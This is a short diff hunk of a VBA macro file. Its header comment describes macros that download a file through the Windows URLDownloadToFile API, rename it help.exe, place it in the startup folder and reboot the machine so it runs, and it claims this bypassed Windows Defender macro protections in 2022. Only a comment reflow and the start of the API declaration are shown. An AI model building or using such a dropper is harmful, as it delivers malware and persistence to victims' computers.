@@ -1,7 +1,8 @@
 'Author: Michael Wurner     @psyc0de
 'Description: The following macros utilize Windows Native API to download a file, rename it as help.exe and place the binary
 '             in the user startup folder. Then the host machine is rebooted. Ideally the binary will execute upon startup. 
-'             utilizing the Windows Native API for file download bypasses macro file download security as of January 2022 tested against fully updated Windows Defender on Windows 10.
+'             utilizing the Windows Native API for file download bypasses macro file download security as of January 2022 
+'             tested against fully updated Windows Defender on Windows 10.
 
 Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
     Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
